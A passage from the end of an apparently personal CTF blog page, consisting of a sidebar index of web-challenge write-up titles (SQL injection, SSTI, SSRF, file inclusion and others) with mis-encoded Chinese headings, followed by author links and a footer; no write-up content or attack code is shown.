class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="nav-number">6.0.0.1.</span> <span class="nav-text">[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="nav-number">6.0.0.2.</span> <span class="nav-text">[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SUCTF-2019-EasySQL"><span class="nav-number">6.0.0.3.</span> <span class="nav-text">[SUCTF 2019]EasySQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="nav-number">6.0.0.4.</span> <span class="nav-text">[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL"><span class="nav-number">6.0.0.5.</span> <span class="nav-text">[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL"><span class="nav-number">6.0.0.6.</span> <span class="nav-text">[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GXYCTF2019-BabySQli"><span class="nav-number">6.0.0.7.</span> <span class="nav-text">[GXYCTF2019]BabySQli</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GYCTF2020-Blacklist"><span class="nav-number">6.0.0.8.</span> <span class="nav-text">[GYCTF2020]Blacklist</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World"><span class="nav-number">6.0.0.9.</span> <span class="nav-text">[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SWPU2019-Web1"><span class="nav-number">6.0.0.10.</span> <span class="nav-text">[SWPU2019]Web1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk"><span class="nav-number">6.0.0.11.</span> <span class="nav-text">[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#RCTF2015-EasySQL"><span class="nav-number">6.0.0.12.</span> <span class="nav-text">[RCTF2015]EasySQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment"><span class="nav-number">6.0.0.13.</span> <span class="nav-text">[ç½‘é¼æ¯ 2018]Comment</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GYCTF2020-Ezsqli"><span class="nav-number">6.0.0.14.</span> <span class="nav-text">[GYCTF2020]Ezsqli</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">7.</span> <span class="nav-text">æ–‡ä»¶åŒ…å«</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="nav-number">7.0.0.1.</span> <span class="nav-text">[ACTF2020 æ–°ç”Ÿèµ›]Include</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="nav-number">7.0.0.2.</span> <span class="nav-text">[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">7.0.0.3.</span> <span class="nav-text">*[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#BSidesCF-2020-Had-a-bad-day"><span class="nav-number">7.0.0.4.</span> <span class="nav-text">[BSidesCF 2020]Had a bad day</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NPUCTF2020-ezinclude"><span class="nav-number">7.0.0.5.</span> <span class="nav-text">[NPUCTF2020]ezinclude</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Http"><span class="nav-number">8.</span> <span class="nav-text">Http</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http"><span class="nav-number">8.0.0.1.</span> <span class="nav-text">[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MRCTF2020-PYWebsite"><span class="nav-number">8.0.0.2.</span> <span class="nav-text">[MRCTF2020]PYWebsite</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MD5"><span class="nav-number">9.</span> <span class="nav-text">MD5</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#BJDCTF2020-Easy-MD5"><span class="nav-number">9.0.0.1.</span> <span class="nav-text">[BJDCTF2020]Easy MD5</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MRCTF2020-Ez-bypass"><span class="nav-number">9.0.0.2.</span> <span class="nav-text">[MRCTF2020]Ez_bypass</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web"><span class="nav-number">9.0.0.3.</span> <span class="nav-text">[å®‰æ´µæ¯ 2019]easy_web</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Java"><span class="nav-number">10.</span> <span class="nav-text">Java</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#RoarCTF-2019-Easy-Java"><span class="nav-number">10.0.0.1.</span> <span class="nav-text">*[RoarCTF 2019]Easy Java</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSTI"><span class="nav-number">11.</span> <span class="nav-text">SSTI</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#BJDCTF2020-The-mystery-of-ip"><span class="nav-number">11.0.0.1.</span> <span class="nav-text">[BJDCTF2020]The mystery of ip</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#BJDCTF2020-Cookie-is-so-stable"><span class="nav-number">11.0.0.2.</span> <span class="nav-text">[BJDCTF2020]Cookie is so stable</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web11"><span class="nav-number">11.0.0.3.</span> <span class="nav-text">[CISCN2019 åä¸œå—èµ›åŒº]Web11</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WesternCTF2018-shrine"><span class="nav-number">11.0.0.4.</span> <span class="nav-text">[WesternCTF2018]shrine</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GYCTF2020-FlaskApp"><span class="nav-number">11.0.0.5.</span> <span class="nav-text">[GYCTF2020]FlaskApp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CSCCTF-2019-Qual-FlaskLight"><span class="nav-number">11.0.0.6.</span> <span class="nav-text">[CSCCTF 2019 Qual]FlaskLight</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#RootersCTF2019-I-lt-3-Flask"><span class="nav-number">11.0.0.7.</span> <span class="nav-text">[RootersCTF2019]I_&lt;3_Flask</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret"><span class="nav-number">11.0.0.8.</span> <span class="nav-text">[CISCN2019 åä¸œå—èµ›åŒº]Double Secret</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF"><span class="nav-number">12.</span> <span class="nav-text">SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#De1CTF-2019-SSRF-Me"><span class="nav-number">12.0.0.1.</span> <span class="nav-text">[De1CTF 2019]SSRF Me</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HITCON-2017-SSRFme"><span class="nav-number">12.0.0.2.</span> <span class="nav-text">[HITCON 2017]SSRFme</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GIT%E6%B3%84%E9%9C%B2"><span class="nav-number">13.</span> <span class="nav-text">GITæ³„éœ²</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#BJDCTF2020-Mark-loves-cat"><span class="nav-number">13.0.0.1.</span> <span class="nav-text">[BJDCTF2020]Mark loves cat</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XML"><span class="nav-number">14.</span> <span class="nav-text">XML</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#NCTF2019-Fake-XML-cookbook"><span class="nav-number">14.0.0.1.</span> <span class="nav-text">[NCTF2019]Fake XML cookbook</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NCTF2019-True-XML-cookbook"><span class="nav-number">14.0.0.2.</span> <span class="nav-text">[NCTF2019]True XML cookbook</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Unicorn"><span class="nav-number">15.</span> <span class="nav-text">Unicorn</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ASIS-2019-Unicorn-shop"><span class="nav-number">15.0.0.1.</span> <span class="nav-text">[ASIS 2019]Unicorn shop</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">16.</span> <span class="nav-text">ä¿¡æ¯æœé›†</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-web%E5%85%A5%E9%97%A8-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%90%9C%E9%9B%86"><span class="nav-number">16.0.0.1.</span> <span class="nav-text">[ç¬¬ä¸€ç«  webå…¥é—¨]å¸¸è§çš„æœé›†</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#misc"><span class="nav-number">17.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%8C%E7%BB%B4%E7%A0%81"><span class="nav-number">17.0.0.1.</span> <span class="nav-text">äºŒç»´ç </span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#N%E7%A7%8D%E6%96%B9%E6%B3%95%E8%A7%A3%E5%86%B3"><span class="nav-number">17.0.0.2.</span> <span class="nav-text">Nç§æ–¹æ³•è§£å†³</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%A0%B4%E8%A7%A3"><span class="nav-number">17.0.0.3.</span> <span class="nav-text">åŸºç¡€ç ´è§£</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%A6%E5%A4%96%E4%B8%80%E4%B8%AA%E4%B8%96%E7%95%8C"><span class="nav-number">17.0.0.4.</span> <span class="nav-text">å¦å¤–ä¸€ä¸ªä¸–ç•Œ</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%A7%E7%99%BD"><span class="nav-number">17.0.0.5.</span> <span class="nav-text">å¤§ç™½</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%A2%E5%85%B7%E4%B8%8B%E7%9A%84flag"><span class="nav-number">17.0.0.6.</span> <span class="nav-text">é¢å…·ä¸‹çš„flag</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#snake"><span class="nav-number">17.0.0.7.</span> <span class="nav-text">snake</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94"><span class="nav-number">18.</span> <span class="nav-text">â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ZJCTF-2019-NiZhuanSiWei"><span class="nav-number">18.0.0.1.</span> <span class="nav-text">[ZJCTF 2019]NiZhuanSiWei</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook"><span class="nav-number">18.0.0.2.</span> <span class="nav-text">[ç½‘é¼æ¯ 2018]Fakebook</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E"><span class="nav-number">18.0.0.3.</span> <span class="nav-text">[WUSTCTF2020]æœ´å®æ— å</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math"><span class="nav-number">18.0.0.4.</span> <span class="nav-text">[CISCN 2019 åˆèµ›]Love Math</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4"><span class="nav-number">18.0.0.5.</span> <span class="nav-text">[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb"><span class="nav-number">18.0.0.6.</span> <span class="nav-text">[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2"><span class="nav-number">18.0.0.7.</span> <span class="nav-text">*[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="nav-number">18.0.0.8.</span> <span class="nav-text">*[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SUCTF-2019-Pythonginx"><span class="nav-number">18.0.0.9.</span> <span class="nav-text">[SUCTF 2019]Pythonginx</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#BJDCTF2020-EasySearch"><span class="nav-number">18.0.0.10.</span> <span class="nav-text">[BJDCTF2020]EasySearch</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="nav-number">18.0.0.11.</span> <span class="nav-text">[æŠ¤ç½‘æ¯ 2018]easy_tornado</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HCTF-2018-admin"><span class="nav-number">18.0.0.12.</span> <span class="nav-text">*[HCTF 2018]admin</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#BUUCTF-2018-Online-Tool"><span class="nav-number">18.0.0.13.</span> <span class="nav-text">*[BUUCTF 2018]Online Tool</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb"><span class="nav-number">18.0.0.14.</span> <span class="nav-text">[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell"><span class="nav-number">18.0.0.15.</span> <span class="nav-text">[çº¢æ˜è°·CTF 2021]write_shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SUCTF-2019-EasyWeb"><span class="nav-number">18.0.0.16.</span> <span class="nav-text">[SUCTF 2019]EasyWeb</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME"><span class="nav-number">18.0.0.17.</span> <span class="nav-text">[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#FBCTF2019-RCEService"><span class="nav-number">18.0.0.18.</span> <span class="nav-text">[FBCTF2019]RCEService</span></a></li></ol></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Ja1e</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">15</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/ja1e" title="GitHub â†’ https:&#x2F;&#x2F;github.com&#x2F;ja1e" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:ja1e428@163.com" title="E-Mail â†’ mailto:ja1e428@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ja1e</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
